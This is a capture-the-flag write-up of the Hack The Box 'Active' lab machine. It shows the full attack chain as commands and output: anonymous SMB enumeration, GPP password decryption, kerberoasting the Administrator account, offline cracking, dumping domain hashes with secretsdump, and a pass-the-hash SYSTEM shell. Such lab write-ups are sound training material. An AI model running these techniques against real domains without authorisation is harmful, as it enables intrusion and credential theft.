---
title: "From GPP to Domain Admin: Cracking HTB 'Active'"
seo_title: "Hack The Box 'Active' Write-up: A Step-by-Step AD Guide"
date: 2025-11-20
layout: single
hideToc: false
tags: ["windows","AD","GPP"]
summary: "Easy rated windows AD box from hackthebox comprising GPP and kerberoasting."
---


# Active

## Box Info

![Active.png](Active%20daa93a9cd54d438fa2d8f309191d4082/Active.png)

Active was an easy rated AD box created by [eks](https://app.hackthebox.com/profile/302) and [mrb3n](https://app.hackthebox.com/profile/2984).

It involves decrypting GPP password for user credentials which we get from null authenticated readable SMB share. Further kerberoasting administrator for gaining system access.

## Recon

### Nmap

```jsx
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-10-19 09:34:58Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
49152/tcp open  msrpc         syn-ack Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

We can see a lot of ports open including kerberos, SMB, LDAP, RPC, etc. Its most likely a domain controller.

I start with `enum4linux.py` for RPC enumeration and we can get the domain details. Lets add them on our hosts file.

```jsx
===========================================================
|    Domain Information via SMB session for 10.10.10.100    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC
NetBIOS domain name: ACTIVE
DNS domain: active.htb
FQDN: DC.active.htb
Derived membership: domain member
Derived domain: ACTIVE
```

### SMB Enumeration

Then we move onto SMB shares. Initially checking for null authentication and we get some shares as readable.

Here `Replication` share is readable with null authentication.

```jsx
root@ea1feccfa881:/usr/src/crackmapexec# cme smb 10.10.10.100 -u '' -p '' --shares
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\: 
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share
SMB         10.10.10.100    445    DC               Users
```

It was a non-default share so I looked into the files and found some interesting information related to GPP in the file `active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml` . 

```jsx
┌─[noob@parrot]─[~/htb/active/anon_smb]
└──╼ $find . -type f 
./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI
./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI
./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol
./active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI
./active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
┌─[noob@parrot]─[~/htb/active/anon_smb]
└──╼ $cat active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

### Group Policy Preferences

It provides the useful capability to leverage Group Policy to “deploy” `scheduled tasks with explicit credentials` and change the local admin passwords on large numbers of computers at once – probably the two most popular usage scenarios.

One of the most useful features of Group Policy Preferences (GPP) is the ability to `store and use credentials in several scenarios.` These include: Map drives (Drives.xml), Create Local Users, Data Sources (DataSources.xml), Printer configuration (Printers.xml), Create/Update Services (Services.xml), Scheduled Tasks (ScheduledTasks.xml), Change local Administrator passwords, etc.

When a new GPP (Group Policy Preference) is created, a corresponding `XML file is generated to store the relevant configuration data`. If a password is present, it is encrypted using `AES-256-bit encryption`. Within the XML file, the `cpassword` field contains the encrypted password. However, in around 2012, Microsoft released the `AES private key`, which made it relatively easy to decrypt the password. [link](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be)

The tool gpp-decrypt automates the process for us and we can get the password from the encrypted text.

```jsx
┌─[✗]─[noob@parrot]─[~/htb/active/svc_tgs]
└──╼ $gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
GPPstillStandingStrong2k18
```

After decrypting the password, we can verify it using either `kerbrute` or `crackmapexec`. In this case, I confirmed it using the latter.

```jsx
root@ea1feccfa881:/usr/src/crackmapexec# cme smb 10.10.10.100 -u svc_tgs -p 'GPPstillStandingStrong2k18' --shares
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share
SMB         10.10.10.100    445    DC               Users           READ
```

### Kerberoasting

Normally, If we don’t have shell on the machine but credentials we can go for `kerberoasting` for lateral movement or look into LDAP for trying to understand the domain better.

```jsx
┌─[noob@parrot]─[~/htb/active/anon_smb]
└──╼ $ldapsearch -x -H ldap://10.10.10.100 -D 'svc_tgs' -w 'GPPstillStandingStrong2k18' -b 'DC=active,DC=htb' '(objectClass=user)'

```

While looking at user accounts our attention went to the fact that the administrator account has `ServicePrincipalName` as not null. 

We know that a domain account is being used as a service if the `SPN` is not null. The goal of `kerberoasting` is to harvest `TGS` tickets of services that run on behalf of user accounts. And we know that some parts of the ticket are encrypted with keys derived from user passwords. Thus we can crack them offline. 

```jsx
# Administrator, Users, active.htb
dn: CN=Administrator,CN=Users,DC=active,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Administrator
description: Built-in account for administering the computer/domain
distinguishedName: CN=Administrator,CN=Users,DC=active,DC=htb
instanceType: 4
whenCreated: 20180718184911.0Z
whenChanged: 20231018154548.0Z
uSNCreated: 8196
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=active,DC=htb
memberOf: CN=Enterprise Admins,CN=Users,DC=active,DC=htb
memberOf: CN=Schema Admins,CN=Users,DC=active,DC=htb
memberOf: CN=Administrators,CN=Builtin,DC=active,DC=htb
uSNChanged: 114725
name: Administrator
objectGUID:: jnHKJRJzf0aVWkxPEJY8Hg==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 131774446554773106
lastLogoff: 0
lastLogon: 133421175785917565
logonHours:: ////////////////////////////
pwdLastSet: 131764144003517228
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAArxktGAS1AL49Gv129AEAAA==
adminCount: 1
accountExpires: 0
logonCount: 64
sAMAccountName: Administrator
sAMAccountType: 805306368
servicePrincipalName: active/CIFS:445
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=active,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20180718203435.0Z
dSCorePropagationData: 20180718201454.0Z
dSCorePropagationData: 20180718190545.0Z
dSCorePropagationData: 20180718190545.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133421175484525035
msDS-SupportedEncryptionTypes: 0
```

Here we can see that the administrator account is vulnerable to kerberoasting. We can use `impackets`  `GetUserSPN.py` to request `TGS` ticket. Then we can crack the password offline to get credentials for the administrator.

```jsx
┌─[noob@parrot]─[~/htb/active/svc_tgs_smb]
└──╼ $GetUserSPNs.py 'active.htb/svc_tgs:GPPstillStandingStrong2k18'
Impacket v0.10.1.dev1+20230504.43204.0bdad34a - Copyright 2022 Fortra

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-10-18 11:46:18.591757             

┌─[noob@parrot]─[~/htb/active/svc_tgs_smb]
└──╼ $GetUserSPNs.py 'active.htb/svc_tgs:GPPstillStandingStrong2k18' -request
Impacket v0.10.1.dev1+20230504.43204.0bdad34a - Copyright 2022 Fortra

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-10-18 11:46:18.591757             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$8294eeac00efb6a535832717bf5a1451$4f37fdd250c515dc4f57eb3604f4ea35acbd738bb1f5bb9377d6f1783f2283790fc4d26c19c6d728cfd4fb6d9fbf08a8c8ef3d97fc9efe5cd8d42d734fbbbb793ef6afb31de509c6086cb7b753335827fb0ba395e37740ca9c97709f3c7838102dc571a870e5b3b4c0619f764f3f630f698ac304ec398c014eaecf1fda2426a5f995dece41df6edd827550027cbba0a26bc2336c3168f89c0f9be84e29b563c4bd381eaafa17c6f9ad0a72563aee92d034995dd045f1eafa4f46711b0a94b9a9cb7fa68957d909f5056cc17b4788d228df96ebce4a2c87bef518430fde760d056188875bc5d5031564f10479c30dd1206fb4f796eb907e7ead2d9d288047da59fd641a2eb15e4222441434ecdb6a544608fb89b6297893424b80fcff84645e5f53f77a504ea5d9fbfd6a708546b4d24180988325718105e1c569c92fcac0b5c69e10c3d7cf59f19cb5cd8d46a16afcd782482e3382fbf3ae75a3397feb8dc82b8ed1378dc22d967d3b5390ca475ae23657c3b228be7637b5a3fc0e891aba8a80ac58c8c0267de6cd8f20408f139775f6ef5b93b80d003abbcad161326e1a202c6af739e155be508a7daa7a52bd6bb01abb0d914a10dd671ddaea232a14a58c13a3da44294450da92b96c02684ce5113df319589beb9f8bac2f9a809dd4f26d6f67e672d9e7409799a259c70f10835794cd558daa7847bd49532c6d704c8911ad9977a6d41221bd8403c3679599cf081f7986ee849992b515e1e5df661b4716fb147f9a5d6092b445c1543a60ed7acd85d23161135d23aa159040e66d5af13c3cbcb89c2dfcd2c59ea5f57fd6e32fd04ad4b9db13932fd484576ea7d68b9af978af6ed96fc796c7ecb9a336d0027102e34fe65fc29db9fd9b9ba67e42272a7d37f9d2ef237a0bedf4f38989610d91b462a61158c311148ca89e7da0cc7477be3ea02496ce73cf27a8fcdee4c0e5374fdefaa4163770679e571601a9cd75e5d93455efb03460ccf72fe12a7cc9fee80833e65267ec9a9ed284690d6609e6c838042328d540aba7b4900a626e1f48170091bb83e9ec0857b6313990d12e8f5efc85cefcd23ff967e3bccb7bef7f66d40df50842e3737d5b9e832a939859b6b950de2f7f2b89fcfbd9a95f890b8db87bfe5b0458454571ab1d19a9688cbbd623733a12ea0b38398f644082efdb554012efbd683080de5f32370f1ce96aa920d36f48e7f22100e126e5a207ea7a634de829c8bc374d35b292ce990fb8
```

We can crack these either with john the ripper or hashcat. We need to know the mode in hashcat but john automatically detects the type of hash.

```jsx
┌─[noob@parrot]─[~/htb/active]
└──╼ $john admin  --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:08 58.29% (ETA: 06:06:55) 0g/s 1014Kp/s 1014Kc/s 1014KC/s ee0133381186..edword11
Ticketmaster1968 (?)
1g 0:00:00:10 DONE (2023-10-19 06:06) 0.09487g/s 999784p/s 999784c/s 999784C/s Tiffani1432..Thurman16
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We can dump the domain hashes with `secretsdump.py` .

```jsx
┌─[noob@parrot]─[~/htb/active]
└──╼ $secretsdump.py 'active.htb/administrator:Ticketmaster1968@10.10.10.100'
Impacket v0.10.1.dev1+20230504.43204.0bdad34a - Copyright 2022 Fortra

[*] Target system bootKey: 0xff954ee81ffb63937b563f523caf1d59
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c15eb37006fb74c21a5d1e2144b726e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
ACTIVE\DC$:aes256-cts-hmac-sha1-96:5de5e20ae2611f75df65633ab000d7c04b5e41c46bc1c02f90291097184d394f
ACTIVE\DC$:aes128-cts-hmac-sha1-96:022fc4401e538ae98c89bca738cb0193
ACTIVE\DC$:des-cbc-md5:1afe5873389df29d
ACTIVE\DC$:plain_password_hex:19d2ce6f30f7603634988e3f6bd9dff85c1e66410596bfe7184e01edf6d91c8787d74c2a2d77726e018c7ca1a2be300c4fe90464be799513980c389e993c7cc894ef5d036c41cb587bcdb601622c2be5231c3e84d6cf968b158e4c75a85d0bea3664ab75261dff7ee8a623729d9c7f158f77c00c3c05188a6ce2472b4a2cfdd40e60aadb6a71554c6f58d52792c5140e63693fc0a1d4439956e6d2353ea0de25bd131d7025a7914a7d20750213e25522fceafdc3c26792abb2f5415f524367b9d4d49f12e968b924c96a02581b257529196001d1dd0640f311a9f1cb3730a92bc76813a2f071b3abc0e3f5c81b83469c
ACTIVE\DC$:aad3b435b51404eeaad3b435b51404ee:5b9f6d9fdf7d10f0c07ed64660f94fa1:::
[*] DefaultPassword 
(Unknown User):ROOT#123
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x377bd35be67705f345dabf00d3181e269e0fb1e6
dpapi_userkey:0x7586c391e559565c85cb342d1d24546381f0d5cb
[*] NL$KM 
 0000   CC 6F B8 46 C3 0C 58 05  2F F2 07 2E DA E6 BF 7D   .o.F..X./......}
 0010   60 63 F6 89 E7 0E D5 D5  22 EE 54 DA 63 12 5B B5   `c......".T.c.[.
 0020   D8 DA 0B B7 82 0E 3D E1  9D 7A 03 15 08 5C B0 AE   ......=..z...\..
 0030   EF 63 91 B9 6C 87 65 A8  14 62 95 BC 77 69 77 08   .c..l.e..b..wiw.
NL$KM:cc6fb846c30c58052ff2072edae6bf7d6063f689e70ed5d522ee54da63125bb5d8da0bb7820e3de19d7a0315085cb0aeef6391b96c8765a8146295bc77697708
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b889e0d47d6fe22c8f0463a717f460dc:::
active.htb\SVC_TGS:1103:aad3b435b51404eeaad3b435b51404ee:f54f3a1d3c38140684ff4dad029f25b5:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:5b9f6d9fdf7d10f0c07ed64660f94fa1:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:003b207686cfdbee91ff9f5671aa10c5d940137da387173507b7ff00648b40d8
Administrator:aes128-cts-hmac-sha1-96:48347871a9f7c5346c356d76313668fe
Administrator:des-cbc-md5:5891549b31f2c294
krbtgt:aes256-cts-hmac-sha1-96:cd80d318efb2f8752767cd619731b6705cf59df462900fb37310b662c9cf51e9
krbtgt:aes128-cts-hmac-sha1-96:b9a02d7bd319781bc1e0a890f69304c3
krbtgt:des-cbc-md5:9d044f891adf7629
active.htb\SVC_TGS:aes256-cts-hmac-sha1-96:d59943174b17c1a4ced88cc24855ef242ad328201126d296bb66aa9588e19b4a
active.htb\SVC_TGS:aes128-cts-hmac-sha1-96:f03559334c1111d6f792d74a453d6f31
active.htb\SVC_TGS:des-cbc-md5:d6c7eca70862f1d0
DC$:aes256-cts-hmac-sha1-96:5de5e20ae2611f75df65633ab000d7c04b5e41c46bc1c02f90291097184d394f
DC$:aes128-cts-hmac-sha1-96:022fc4401e538ae98c89bca738cb0193
DC$:des-cbc-md5:02861ca1a71907a1
[*] Cleaning up...
```

We can get system shell with `psexec.py` .

```jsx
┌─[noob@parrot]─[~/htb/active/svc_tgs_smb]
└──╼ $psexec.py 'active.htb/administrator@dc.active.htb' -hashes 'aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed'
Impacket v0.10.1.dev1+20230504.43204.0bdad34a - Copyright 2022 Fortra

[*] Requesting shares on dc.active.htb.....
[*] Found writable share ADMIN$
[*] Uploading file AHYMkugS.exe
[*] Opening SVCManager on dc.active.htb.....
[*] Creating service EiEB on dc.active.htb.....
[*] Starting service EiEB.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### References

[https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast) 

[https://adsecurity.org/?p=2288](https://adsecurity.org/?p=2288)